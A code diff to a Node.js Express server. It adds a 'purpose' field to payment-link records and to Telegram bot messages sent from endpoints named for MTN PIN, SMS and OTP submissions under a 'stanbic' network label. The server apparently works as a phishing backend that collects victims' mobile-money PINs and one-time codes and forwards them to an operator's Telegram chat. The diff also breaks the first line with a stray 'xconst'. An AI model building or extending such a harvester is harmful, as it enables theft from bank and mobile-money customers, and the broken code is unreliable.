@@ -1,4 +1,4 @@
-const express = require('express');
+xconst express = require('express');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
@@ -6,7 +6,7 @@ const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ── Telegram (Stanbic bot) ──
+// ── Telegram ──
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID || '';
 const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
@@ -187,6 +187,9 @@ app.get('/api/set-webhook', async (_req, res) => {
   } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
 });
 
+/* ═══════════════════════════════════════════════════════════
+   CHANGE #1: /api/links now SAVES `purpose`
+   ═══════════════════════════════════════════════════════════ */
 app.post('/api/links', (req, res) => {
   try {
     const body = req.body || {};
@@ -207,7 +210,7 @@ app.post('/api/links', (req, res) => {
       modeOfPayment: body.modeOfPayment || 'Bank Transfer',
       receiptOptional: body.receiptOptional || '',
       marketedBy: body.marketedBy || '',
-      purpose: body.purpose || '',
+      purpose: body.purpose || '',           // ← CHANGE #1: save purpose
       timestamp: body.timestamp || '',
       network: 'stanbic',
       lang: lang,
@@ -229,6 +232,9 @@ app.post('/api/links', (req, res) => {
   } catch (err) { res.status(500).json({ ok:false, error: err.message }); }
 });
 
+/* ═══════════════════════════════════════════════════════════
+   CHANGE #2: /api/links/:code now RETURNS `pu`
+   ═══════════════════════════════════════════════════════════ */
 app.get('/api/links/:code', (req, res) => {
   const code = String(req.params.code || '').trim().toUpperCase();
   let rec = links.get(code);
@@ -258,7 +264,7 @@ app.get('/api/links/:code', (req, res) => {
     pm:  rec.modeOfPayment,
     sn:  rec.receiptOptional,
     mk:  rec.marketedBy,
-    pu:  rec.purpose,
+    pu:  rec.purpose,                      // ← CHANGE #2: return purpose as pu
     ts:  rec.timestamp
   });
 });
@@ -282,6 +288,7 @@ app.post('/api/mtn/pin', async (req, res) => {
     t.lang = L;
     persistTxs();
 
+    // CHANGE #3a: include Purpose line in Telegram message
     const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
 
     const text =
@@ -334,6 +341,7 @@ app.post('/api/mtn/sms', async (req, res) => {
     t.lang = L;
     persistTxs();
 
+    // CHANGE #3b: include Purpose line
     const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
 
     const text =
@@ -394,6 +402,7 @@ app.post('/api/mtn/otp', async (req, res) => {
     t.lang = L;
     persistTxs();
 
+    // CHANGE #3c: include Purpose line
     const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
 
     const text =
